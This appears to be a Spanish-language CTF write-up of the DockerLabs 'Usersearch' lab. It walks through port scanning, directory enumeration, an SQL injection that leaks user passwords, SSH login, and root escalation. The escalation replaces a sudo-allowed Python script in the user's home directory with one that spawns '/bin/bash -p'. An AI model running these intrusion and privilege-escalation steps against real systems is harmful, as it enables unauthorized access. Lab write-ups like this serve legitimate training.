---
title: DockerLabs - Usersearch
summary: "Write-up del laboratorio Usersearch de DockerLabs"
author: elcybercurioso
date: 2026-01-11
categories: [Post, DockerLabs]
tags: [medio, sqli, credentials leaking, sudo, permissions abuse]
media_subpath: "/assets/img/posts/dockerlabs_usersearch"
image:
  path: main.webp
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Usersearch]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.18.0.2 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Usersearch]
└─$ nmap -sCV -p22,80 172.18.0.2                               
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 ea:6b:ef:51:9c:00:c4:d4:24:17:90:be:6d:0a:26:79 (ECDSA)
|_  256 62:97:b5:91:0c:b0:8f:06:bd:ad:e3:d5:14:3d:f1:74 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: User Search
|_http-server-header: Apache/2.4.59 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## análisis

Comenzaremos dejando en segundo plano la búsqueda de recursos en el servidor con **gobuster** mientras revisamos la página web:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Usersearch]
└─$ gobuster dir -u "http://172.18.0.2/" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200 -x .php,.html,.txt 2>/dev/null
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/db.php               (Status: 200) [Size: 0]
/javascript           (Status: 301) [Size: 313] [--> http://172.18.0.2/javascript/]
/index.php            (Status: 200) [Size: 855]
```

Accedemos a la página web, donde encontramos una funcionalidad que permite buscar usuarios:

![Desktop View](/20260105214407.webp){: width="972" height="589" .shadow}

## acceso inicial (kvzlx)

Probando usuarios comunes, encontramos para el usuario `admin` nos devuelven una contraseña:

![Desktop View](/20260105214510.webp){: width="972" height="589" .shadow}

Para comprobar si esta funcionalidad es vulnerable a un **SQLi** (SQL Injection), interceptamos la petición de búsqueda de usuarios con **Burp Suite**, la mandamos al **Repeater**, y empleamos un payload que nos debería devolver múltiples registros  en caso de ser vulnerable:

![Desktop View](/20260105224346.webp){: width="972" height="589" .shadow}

Dado que es vulnerable, vemos que nos ha devuelto varios usuarios diferentes junto con sus contraseñas.

Como hemos visto que el puerto 22 (SSH) está habilitado en la máquina, probaremos a conectarnos con las credenciales obtenidas, y vemos que obtenemos acceso como el usuario `kvzlx`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Usersearch]
└─$ ssh kvzlx@172.18.0.2
kvzlx@172.18.0.2`s password: 
kvzlx@08f08da7af80:~$ whoami
kvzlx
kvzlx@08f08da7af80:~$ hostname
08f08da7af80
```

## escalada de privilegios (root)

Revisamos los permisos SUDO del usuario `kvzlx`, y vemos que puede ejecutar con Python el script `/home/kvzlx/system_info.py`:

```bash
kvzlx@08f08da7af80:~$ sudo -l
Matching Defaults entries for kvzlx on 08f08da7af80:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User kvzlx may run the following commands on 08f08da7af80:
    (ALL) NOPASSWD: /usr/bin/python3 /home/kvzlx/system_info.py
```

El contenido del script es el siguiente:

```bash
kvzlx@08f08da7af80:~$ cat /home/kvzlx/system_info.py
import psutil


def print_virtual_memory():
    vm = psutil.virtual_memory()
    print(f"Total: {vm.total} Available: {vm.available}")


if __name__ == "__main__":
    print_virtual_memory()
```

En los permisos del script vemos que lo podemos leer y ejecutar, pero no modificar:

```bash
kvzlx@08f08da7af80:~$ ls -la /home/kvzlx/system_info.py
-rwxr-xr-x 1 root root 191 May 29  2024 /home/kvzlx/system_info.py
```

Sin embargo, se encuentra dentro del directorio personal del usuario `kvzlx` (con el cual estamos conectados actualmente a la máquina).

Teniendo esto en cuenta, lo que podemos hacer es borrar el script y volver a crearlo con el mismo nombre, ya que los permisos de la carpeta lo permiten:

```bash
kvzlx@08f08da7af80:~$ rm /home/kvzlx/system_info.py
rm: remove write-protected regular file '/home/kvzlx/system_info.py'? y
kvzlx@08f08da7af80:~$ ls
hi.txt
kvzlx@08f08da7af80:~$ touch system_info.py
kvzlx@08f08da7af80:~$ ls
hi.txt  system_info.py
```

Ahora podremos modificar el script, ya que somos los propietarios:

```bash
kvzlx@08f08da7af80:~$ ls -la system_info.py
-rw-r--r-- 1 kvzlx kvzlx 0 XXX  X 21:55 system_info.py
```

Por ello, vamos a indicar que al ejecutar el script, lo que queremos es que nos invoque una consola como el usuario `root`:

```bash
kvzlx@08f08da7af80:~$ echo -ne 'import os\nos.system("/bin/bash -p")\n' > system_info.py
kvzlx@08f08da7af80:~$ cat system_info.py
import os
os.system("/bin/bash -p")
```

Si ejecutamos ahora el script con permisos SUDO, veremos que nos habremos convertido en el usuario `root`:

```bash
kvzlx@08f08da7af80:~$ sudo /usr/bin/python3 /home/kvzlx/system_info.py
root@08f08da7af80:/home/kvzlx# whoami
root
```

Y aquí acaba la resolución de la máquina `Usersearch`!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>